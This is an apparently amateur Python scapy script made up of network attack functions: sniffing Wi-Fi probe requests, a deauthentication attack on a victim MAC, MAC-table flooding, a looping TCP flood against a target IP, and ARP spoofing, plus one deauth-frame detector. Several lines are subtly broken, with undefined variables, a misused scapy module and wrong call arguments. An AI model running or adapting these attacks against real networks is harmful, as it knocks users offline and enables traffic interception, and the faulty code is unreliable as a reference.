import threading
from collections import deque

from scapy.all import RandIP, RandMAC, sniff
from scapy.layers import dot11, eap, inet
from scapy.modules import ethertypes
from scapy.sendrecv import send, sendp, srp
from scapy.layers.l2 import ARP

probe_list = []

# access_point = input('Enter the name of access point: ')

IGNORE_LIST = []

SEEN_CLIENTS = deque()

i = 1

def probe_information():
    def sniffer(packet):
        if packet.haslayer(dot11.Dot11ProbeReq):
            client_name = packet.info
            if client_name == access_point:
                if packet.addr2 not in IGNORE_LIST:
                    print('New probe: ', client_name, '@ MAC ', packet.addr2)
                    SEEN_CLIENTS.append(packet.addr2)

    while True:
        sniff(iface='mon0', prn=sniffer)


def deauth_attack():
    frame = dot11.RadioTap() / dot11.Dot11(addr1=vctm_mac, addr2=BSSID, addr3=BSSID) / dot11.Dot11Deauth()
    sendp(frame, iface="mon0", count=500, inter=.1)


def detect_deauth():
    def detectron(packet):
        if packet.haslayer(dot11.Dot11):
            if packet.type == 0 and packet.subtype == 12:
                print('Deauth frame detected: ', i)
                i = i + 1

    sniff(iface="mon0", prn=detectron)


def mac_flooding():
    def overflow(func):
        sendp(func(), iface='wlan')
    
    @overflow
    def generate_packets():
        packet_list = deque()
        for _ in range(1, 1000):
            packet = eap.Ether(src=RandMAC(), dst=RandMAC()) / inet.IP(src=RandIP(), dst=RandIP())
            packet_list.append(packet)
        return packet_list

    return generate_packets


def ddos_attack():
    source_ip = input('Source IP: ')
    target_ip = input('Target IP: ')
    port = input('Source port: ')

    def start():
        while True:
            ip_one = inet.IP(source_ip, target_ip)
            tcp_one = inet.TCP(port, dstport=80)
            packet = ip_one / tcp_one
            send(packet=packet, x=.01)
            print('Packet sent')

    thread = threading.Thread(target=start)
    thread.start()

def spoofing():
    my_mac_address = 'A8-6D-AA-90-F5-BF'
    ip_to_spoof = ''
    packet = eap.Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(psrc=ip_to_spoof, hwsrc=my_mac_address)
    srp(packet, verbose=0, timeout=0.01)
